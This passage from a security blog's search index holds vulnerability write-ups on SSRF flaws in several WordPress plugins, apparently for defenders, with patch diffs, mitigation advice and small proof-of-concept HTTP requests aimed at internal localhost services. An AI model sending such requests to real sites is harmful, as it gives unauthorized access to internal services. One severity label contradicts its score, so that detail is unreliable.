domain) to block out-of-scope URLs and reduce risk; switching to wp_safe_remote_get() and adding additional validations is recommended for stronger protection. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Update the plugin to 5.2.5+ immediately. Do not trust client-supplied URLs — validate/normalize and apply a domain allowlist before fetching. Block requests to private/loopback IP ranges after DNS resolution (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, fc00::/7, etc.). Avoid forwarding internal credentials/cookies and avoid returning raw headers/body unless necessary. Use wp_safe_remote_get() with checks for redirects, timeouts, and SSL; log and limit body size before returning to the client. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Real Cookie Banner Plugin \u003c= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Broken Link Notifier Plugin.","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Broken Link Notifier plugin for WordPress is vulnerable to Server‑Side Request Forgery in all versions up to and including 1.3.0 via the ajax_blinks() function which ultimately calls check_url_status_code(). This allows unauthenticated attackers to perform web requests to arbitrary addresses from the web application and can be used to query or modify information from internal services. CVE ID: CVE-2025-6851 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.3.0 Patched Versions: 1.3.1 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Broken Link Notifier Plugin ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Broken Link Notifier: 1.3.0 (vulnerable) and 1.3.1 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff helpers.php - v1.3.0 public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code In the vulnerable version, the check_url_status_code() function calls wp_remote_get() directly with the user-supplied URL without validating or checking the safety of the URL. This creates a SSRF (Server-Side Request Forgery) vulnerability. This version does not check the URL scheme, whether the host is valid, or whether the IP belongs to private/reserved ranges, so all requests are executed without restriction. helpers.php - v1.3.1 public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Block SSRF to private/reserved ranges $unsafe = $this-\u003eis_url_unsafe( $link ); if ( $unsafe ) { return apply_filters( 'blnotifier_status', $unsafe ); } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code protected function is_url_unsafe( $url ) { $parts = wp_parse_url( $url ); if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: invalid or malformed URL', 'link' =\u003e $url ]; } $scheme = strtolower( $parts[ 'scheme' ] ); if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: unsupported URL scheme', 'link' =\u003e $url ]; } $host = $parts[ 'host' ]; $records = @dns_get_record( $host, DNS_A + DNS_AAAA ); $ips = []; if ( is_array( $records ) \u0026\u0026 count( $records ) ) { foreach ( $records as $record ) { if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'A' \u0026\u0026 ! empty( $record[ 'ip' ] ) ) { $ips[] = $record[ 'ip' ]; } if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'AAAA' \u0026\u0026 ! empty( $record[ 'ipv6' ] ) ) { $ips[] = $record[ 'ipv6' ]; } } } else { $resolved = gethostbyname( $host ); if ( $resolved \u0026\u0026 $resolved !== $host ) { $ips[] = $resolved; } } if ( empty( $ips ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: host could not be resolved', 'link' =\u003e $url ]; } foreach ( $ips as $ip ) { if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: resolved to internal or reserved IP address', 'link' =\u003e $url ]; } } return false; // Safe } // End is_url_unsafe() The patch added the is_url_unsafe() function. Before calling wp_remote_get(), the URL is checked in detail: only http and https schemes are allowed, the host is validated, DNS resolution is performed to obtain IPs, and any internal or reserved IP addresses are blocked. If the URL is invalid or unsafe, the function returns detailed block information and does not perform the request, thereby effectively preventing SSRF. The patch ensures only safe URLs are allowed to be fetched, reducing the risk of external attacks. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code helpers.php - v1.3.0 public function check_url_status_code( $url, $timeout = null ) { // Get the 'allow_redirects' option and sanitize it $allow_redirects = filter_var( get_option( 'blnotifier_allow_redirects' ), FILTER_VALIDATE_BOOLEAN ); // Determine the request method based on allow_redirects option $request_method = $allow_redirects ? 'GET' : 'HEAD'; // Force giving head for images, videos, and audio files if ( $request_method == 'GET' ) { $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) ); if ( in_array( $file_extension, $this-\u003eget_force_head_file_types() ) ) { $request_method = 'HEAD'; } } // User agent $user_agent = $this-\u003eget_user_agent( $url ); // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Check if from youtube if ( $watch_url = $this-\u003eis_youtube_link( $link ) ) { $link = 'https://www.youtube.com/oembed?format=json\u0026url='.$watch_url; } // The request args // See https://developer.wordpress.org/reference/classes/WP_Http/request/ $http_request_args = apply_filters( 'blnotifier_http_request_args', [ 'method' =\u003e $request_method, 'timeout' =\u003e $timeout, 'redirection' =\u003e absint( get_option( 'blnotifier_max_redirects', 5 ) ), 'httpversion' =\u003e '1.1', 'sslverify' =\u003e filter_var( get_option( 'blnotifier_ssl_verify', true ), FILTER_VALIDATE_BOOLEAN ), 'user-agent' =\u003e $user_agent ], $url ); // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } // Let's make invalid URL 0 codes broken if ( $code === 0 \u0026\u0026 ( $error == 'A valid URL was not provided.' || strpos( $error, 'cURL error 6: Could not resolve host' ) !== false ) ) { $code = 666; } // Possible Codes $codes = $this-\u003eget_status_codes(); // Files too large if ( $request_method == 'GET' ) { $content_length = wp_remote_retrieve_header( $response, 'content-length' ); if ( $content_length \u0026\u0026 $content_length \u003e 10 * 1024 * 1024 ) { // 10 MB $code = 413; } } // Bad links if ( in_array( $code, $this-\u003eget_bad_status_codes() ) ) { $type = 'broken'; // Warnings } elseif ( in_array( $code, $this-\u003eget_warning_status_codes() ) ) { $type = 'warning'; // Good links } else { $type = 'good'; } // Filter status $status = apply_filters( 'blnotifier_status', [ 'type' =\u003e $type, 'code' =\u003e $code, 'text' =\u003e ( $code !== 0 \u0026\u0026 ( isset( $codes[ $code ] ) \u0026\u0026 $codes[ $code ][ 'msg' ] != '' ) ) ? $codes[ $code ][ 'msg' ] : $error, 'link' =\u003e $url ] ); // Return the array return $status; } // End check_url_status_code The check_url_status_code() function is responsible for checking the status of a URL and classifying it as good, warning, or broken. Specifically, the function performs the following main steps: Retrieve configuration options Get the blnotifier_allow_redirects option from the database and convert it to boolean → Decide whether to use GET or HEAD for the request. Choose request method If allow_redirects = true, default to GET. If the URL is a media file (image, video, audio), the function forces HEAD to avoid downloading large files. Determine user-agent Calls $this-\u003eget_user_agent() to get an appropriate user-agent for the request. Normalize the URL If the URL starts with / → prepend home_url() to form an absolute URL. If the URL is a YouTube link, convert it to the oembed endpoint to obtain information safely without accessing the video directly. Configure the request: Build the $http_request_args array containing request parameters: method (GET/HEAD) timeout redirection (max number of redirects) sslverify (whether to verify SSL) user-agent Perform the request Call wp_remote_get($link, $http_request_args) to obtain the response. If no error → retrieve the status code from the server. If error → retrieve the error message. Handle invalid URLs Some basic errors such as invalid URL provided or host not resolvable → a","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph LR A[Anonymous Client sends URL] --\u003e B[ajax_blinks] B --\u003e C[check_link] C --\u003e D[check_url_status_code] D --\u003e E[wp_remote_get with user-supplied URL] E --\u003e F[Response from server] graph LR A[Anonymous Client sends URL] --\u003e B[ajax_blinks] B --\u003e C[check_link] C --\u003e D[check_url_status_code] D --\u003e E[wp_remote_get with user-supplied URL] E --\u003e F[Response from server] graph LR A[Anonymous Client sends URL] --\u003e B[ajax_blinks] B --\u003e C[check_link] C --\u003e D[check_url_status_code] D --\u003e E[wp_remote_get with user-supplied URL] E --\u003e F[Response from server] graph LR A[Anonymous Client sends URL] --\u003e B[ajax_blinks] B --\u003e C[check_link] C --\u003e D[check_url_status_code] D --\u003e E[wp_remote_get with user-supplied URL] E --\u003e F[Response from server] ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service using Python from flask import Flask, request import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Visit the homepage and obtain the nonce Send a POST request to the endpoint POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=blnotifier_blinks\u0026nonce=87f4d1ef16\u0026source_url=http://localhost:8001/\u0026header_links[0]=http://127.0.0.1:8001/delete?id=1 Result: Successfully sent request to local service ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Broken Link Notifier versions ≤1.3.0 are vulnerable to SSRF: the endpoint allows anonymous users to supply URLs, which leads to wp_remote_get() being called against internal services. Version 1.3.1 added DNS/IP checks and restrictions, preventing SSRF before the request is performed. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Upgrade immediately to ≥1.3.1. Do not trust client-provided URLs — validate/allowlist before fetching. Block internal IPs (resolve DNS, block private/reserved ranges). Restrict endpoint privileges (do not allow anonymous). Return status instead of raw body when content is not needed. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Broken Link Notifier Plugin \u003c= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 2.1.4. The cause is insufficient validation of URLs supplied via the url parameter. This allows unauthenticated attackers to make web requests to arbitrary addresses originating from the web application, which can be used to query or modify information from internal services, as well as conduct network reconnaissance. The vulnerability was partially patched in version 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) and 2.1.5 (patched). Diff tool - Meld or any diff tool to compare differences between versions. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Because some source was partially patched in 2.1.4, we will analyze using version 2.1.3. FetchDemo.php - v2.1.3 protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } In version 2.1.3, the plugin defines a POST API with permission_callback =\u003e __return_true, allowing any user, including anonymous users, to invoke fetch_external_content() with a required url parameter. This function uses wp_remote_get to send a request to the provided URL and returns the response body. Because there is no mechanism to control or filter internal URLs, an attacker can send requests to internal services, leading to SSRF exploitable by anonymous users. FetchDemo.php - v2.1.5 protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } In the 2.1.5 fix, the plugin made several changes to mitigate SSRF risk: Changed the endpoint from /live-preview to /live-preview-template. Replaced wp_remote_get() with wp_safe_remote_get(), which helps WordPress automatically block requests to internal addresses such as localhost, 127.0.0.1, or 169.254.*. As a result, user-supplied requests to internal resources on the server are blocked, preventing straightforward SSRF exploitation. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code get_routes() is invoked inside register_routes(): Api.php - v2.1.3 protected $namespace = 'pbb/v1'; public function register_routes() { $routes = $this-\u003eget_routes(); foreach ($routes as $route) { register_rest_route( $this-\u003enamespace, $route['endpoint'], [ 'methods' =\u003e $route['methods'], 'callback' =\u003e [$this, $route['callback']], 'permission_callback' =\u003e isset($route['permission_callback']) ? $route['permission_callback'] : [$this, 'permission_callback'], ] ); } } public function permission_callback(): bool { return current_user_can('manage_options'); } When register_routes() runs, all routes returned by get_routes() are registered with the WordPress REST API via register_rest_route(). Here: Each route maps to an endpoint, method, and callback. If a route lacks a permission_callback, the plugin defaults to $this-\u003epermission_callback, requiring the manage_options capability (typically admin). However, in 2.1.3, the /live-preview route is explicitly declared with permission_callback =\u003e '__return_true', which bypasses the permission check, allowing anyone (including anonymous users) to call that API. When a POST request is sent to /wp-json/pbb/v1/live-preview, fetch_external_content() executes. It reads the url parameter from the request, performs a fetch request to that address, and returns the response body. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service using Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a POST request to the endpoint POST /wp-json/pbb/v1/live-preview HTTP/1.1 Host: localhost ... url=http://localhost:8001/metadata Result: Content read from local service ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions ≤ 2.1.4 of PopupKit are vulnerable to SSRF: the /wp-json/pbb/v1/live-preview endpoint allows anonymous users to call fetch_external_content() with a client-provided url; the function uses wp_remote_get() and returns the response body directly, enabling access to internal services. Version 2.1.5 switched to wp_safe_remote_get() and restricted access to admin-only, which reduces risk. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Update to 2.1.5+. Do not trust client URLs — validate/allowlist before fetching. Use wp_safe_remote_get() and add additional checks (redirects, DNS). Do not use permission_callback =\u003e __return_true; restrict permissions. Do not return raw response bodies unless necessary. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress PopupKit Plugin \u003c= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Spectra Plugin.","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info A Server Side Request Forgery (SSRF) vulnerability was discovered in the WordPress Spectra plugin (previously named Ultimate Addons for Gutenberg) affecting versions up to 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) and 2.6.7 (patched). Diff tool - Meld or any diff/comparison tool to check and compare differences between the two versions. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: class-ast-block-templates.php v2.6.6 public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } In version 2.6.6, the template_importer() function takes the api_uri parameter directly from $_REQUEST and uses that value to send an HTTP request via wp_remote_get(): Because there is no validation or source restriction, an attacker can supply an arbitrary URL to force the server to make requests to internal addresses. This creates a Server-Side Request Forgery (SSRF) vulnerability. Patched version: class-ast-block-templates.php v2.6.7 public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } The patch removed taking a URL directly from user input. Instead, the code only accepts a block ID via $_REQUEST['id'] and retrieves the corresponding URL from the database (wp_options) under the key ast-block-templates_data-{id}: Thus, the URL is constrained to records managed by the system, eliminating the ability for a user to provide an arbitrary path. This mechanism prevents SSRF and increases safety when performing server-side API calls. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code template_importer() requires the user to have privileges from Contributor or higher if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } CSRF protection is implemented with a nonce named _ajax_nonce; if the nonce does not match, the logic exits and returns an error. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); Tip The disclosed vulnerability requires Contributor privileges, so the _ajax_nonce value is very likely present in the Admin UI code. For vulnerabilities tied to Contributor privileges and post creation features, you can look for _ajax_nonce by inspecting the post creation/edit UI in the admin (or searching the script/HTML generated by the Admin pages). _ajax_nonce in response After verification steps, the code takes the api_uri value directly from $_REQUEST, runs it through esc_url_raw(), appends query parameters, and performs an HTTP request using wp_remote_get() $api_uri = isset( $_REQUEST['api_uri'] ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = array( '_fields' =\u003e 'original_content' ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); $response = wp_remote_get( $demo_api_uri, $api_args ); Finally it decodes the response and returns JSON with the original_content key $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); template_importer() is registered as the callback for the action hook: add_action( 'wp_ajax_ast_block_templates_importer', array( $this, 'template_importer' ) ); Meaning, when accessing the endpoint /wp-admin/admin-ajax/php with action=ast_block_templates_importer the template_importer() function is invoked. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 